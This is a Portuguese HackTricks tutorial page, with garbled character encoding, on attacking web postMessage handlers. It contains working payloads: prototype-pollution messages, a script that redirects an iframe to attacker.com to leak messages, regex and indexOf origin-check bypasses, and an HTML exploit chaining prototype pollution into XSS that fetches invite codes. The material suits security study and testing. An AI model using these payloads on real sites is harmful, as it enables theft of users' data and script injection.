# Vulnerabilidades PostMessage

## Vulnerabilidades PostMessage

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Enviar **PostMessage**

**PostMessage** utiliza a seguinte fun√ß√£o para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Observe que **targetOrigin** pode ser um '\*' ou uma URL como _https://company.com._\
No **segundo cen√°rio**, a **mensagem s√≥ pode ser enviada para aquele dom√≠nio** (mesmo que a origem do objeto window seja diferente).\
Se o **coringa** for usado, **mensagens poder√£o ser enviadas para qualquer dom√≠nio**, e ser√£o enviadas para a origem do objeto Window.

### Atacando iframe & coringa em **targetOrigin**

Como explicado [**neste relat√≥rio**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) se voc√™ encontrar uma p√°gina que pode ser **iframed** (sem prote√ß√£o `X-Frame-Header`) e que est√° **enviando mensagens sens√≠veis** via **postMessage** usando um **coringa** (\*), voc√™ pode **modificar** a **origem** do **iframe** e **vazar** a **mensagem sens√≠vel** para um dom√≠nio controlado por voc√™.\
Observe que se a p√°gina pode ser iframed mas o **targetOrigin** est√° **definido para uma URL e n√£o para um coringa**, este **truque n√£o funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Explora√ß√£o de addEventListener

**`addEventListener`** √© a fun√ß√£o usada pelo JS para declarar a fun√ß√£o que est√° **esperando `postMessages`**.\
Um c√≥digo semelhante ao seguinte ser√° utilizado:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Note neste caso como a **primeira coisa** que o c√≥digo est√° fazendo √© **verificar a origem**. Isso √© extremamente **importante**, principalmente se a p√°gina for fazer **algo sens√≠vel** com a informa√ß√£o recebida (como mudar uma senha). **Se n√£o verificar a origem, atacantes podem fazer com que v√≠timas enviem dados arbitr√°rios para esses endpoints** e mudem as senhas das v√≠timas (neste exemplo).

### Enumera√ß√£o

Para **encontrar ouvintes de eventos** na p√°gina atual, voc√™ pode:

* **Procurar** no c√≥digo JS por `window.addEventListener` e `$(window).on` (_vers√£o JQuery_)
* **Executar** no console das ferramentas de desenvolvedor: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Ir para** _Elementos --> Ouvintes de Eventos_ nas ferramentas de desenvolvedor do navegador

![](<../../.gitbook/assets/image (617).png>)

* Usar uma **extens√£o de navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas extens√µes de navegador ir√£o **interceptar todas as mensagens** e mostr√°-las para voc√™.

### Bypasses de verifica√ß√£o de origem

* **`event.isTrusted`** √© Verdadeiro quando o evento foi gerado por uma a√ß√£o do usu√°rio. N√£o √© realmente contorn√°vel se corretamente aplicado, mas vale a pena mencionar.
* Se **`indexOf()`** for usado para **verificar** a **origem** do evento PostMessage, lembre-se de que pode ser facilmente contornado como no exemplo a seguir:
```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Se **`search()`** for usado para **validar** a **origem**, pode ser inseguro. De acordo com a documenta√ß√£o de `String.prototype.search()`, o m√©todo **recebe um objeto de express√£o regular** em vez de uma string. Se algo al√©m de regexp for passado, ser√° implicitamente convertido em regex.\
Em express√£o regular, **um ponto (.) √© tratado como um coringa**. Um atacante pode tirar vantagem disso e **usar** um **dom√≠nio especial** em vez do oficial para burlar a valida√ß√£o, como em:
```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Assim como no exemplo anterior, **`match()`** tamb√©m verifica uma **regex**, ent√£o se a regex estiver malformada, ela pode ser **bypass√°vel**.
* Se a fun√ß√£o **`escapeHtml`** for usada, a fun√ß√£o n√£o cria um objeto `new` escapado, em vez disso, ela **sobrescreve propriedades** do objeto existente. Isso significa que se conseguirmos criar um objeto com uma propriedade controlada que n√£o responda a `hasOwnProperty`, ela n√£o ser√° escapada.
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
O objeto `File` √© perfeito para este exploit, pois possui uma propriedade `name` somente leitura que √© usada pelo nosso template e ir√° contornar a fun√ß√£o `escapeHtml`.

### e.origin == window.origin bypass

Quando uma p√°gina est√° embutida em um **iframe sandboxed** atrav√©s de `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`, o **origin** desse **iframe** ser√° **`null`**.

Quando o **valor de sandbox `allow-popups` est√° definido**, ent√£o o **popup aberto** ir√° **herdar** todos os **atributos sandboxed**, a menos que `allow-popups-to-escape-sandbox` esteja definido.\
Assim, abrir um **popup** de um **origin null** far√° com que **`window.origin`** dentro do popup tamb√©m seja **`null`**.

Portanto, se voc√™ abrir um **iframe sandboxed** permitindo popups, e ent√£o **abrir um popup** a partir do iframe, e **enviar uma postMessage** do iframe **para o popup**, ambos os origins s√£o null, ent√£o: **`e.origin == window.origin == null`**

Para mais informa√ß√µes **leia**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contornando e.source

√â poss√≠vel verificar se a mensagem veio da mesma janela em que o script est√° ouvindo (especialmente interessante para **Content Scripts de extens√µes de navegador** para verificar se a mensagem foi enviada da mesma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Voc√™ pode for√ßar o **`e.source`** de uma mensagem a ser nulo criando um **iframe** que **envia** a **postMessage** e √© **imediatamente deletado**.

Para mais informa√ß√µes **leia:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass do X-Frame-Header

Para realizar esses ataques idealmente voc√™ conseguir√° **colocar a p√°gina web da v√≠tima** dentro de um `iframe`. Mas alguns cabe√ßalhos como `X-Frame-Header` podem **impedir** esse **comportamento**.\
Nesses cen√°rios, voc√™ ainda pode usar um ataque menos discreto. Voc√™ pode abrir uma nova aba para a aplica√ß√£o web vulner√°vel e se comunicar com ela:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubando mensagem enviada para o iframe filho bloqueando a p√°gina principal

Na p√°gina a seguir, voc√™ pode ver como poderia roubar **dados sens√≠veis de postmessage** enviados para um **iframe filho** ao **bloquear** a p√°gina **principal** antes de enviar os dados e abusar de um **XSS no filho** para **vazar os dados** antes de serem recebidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Roubando mensagem modificando a localiza√ß√£o do iframe

Se voc√™ pode colocar um iframe em uma p√°gina web sem o cabe√ßalho X-Frame-Header que cont√©m outro iframe, voc√™ pode **mudar a localiza√ß√£o desse iframe filho**, ent√£o se ele est√° recebendo um **postmessage** enviado usando um **coringa**, um atacante poderia **mudar** a **origem** desse iframe para uma p√°gina **controlada** por ele e **roubar** a mensagem:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage para Polui√ß√£o de Prot√≥tipo e/ou XSS

Em cen√°rios onde os dados enviados atrav√©s de `postMessage` s√£o executados por JS, voc√™ pode colocar um **iframe** na **p√°gina** e **explorar** a **polui√ß√£o de prot√≥tipo/XSS** enviando o exploit via `postMessage`.

Um par de **XSS muito bem explicados atrav√©s de `postMessage`** podem ser encontrados em [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemplo de um exploit para abusar de **Polui√ß√£o de Prot√≥tipo e depois XSS** atrav√©s de um `postMessage` para um `iframe`:
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **mais informa√ß√µes**:

* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo**](../deserialization/nodejs-proto-prototype-pollution/)
* Link para a p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo do lado do cliente para XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Refer√™ncias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
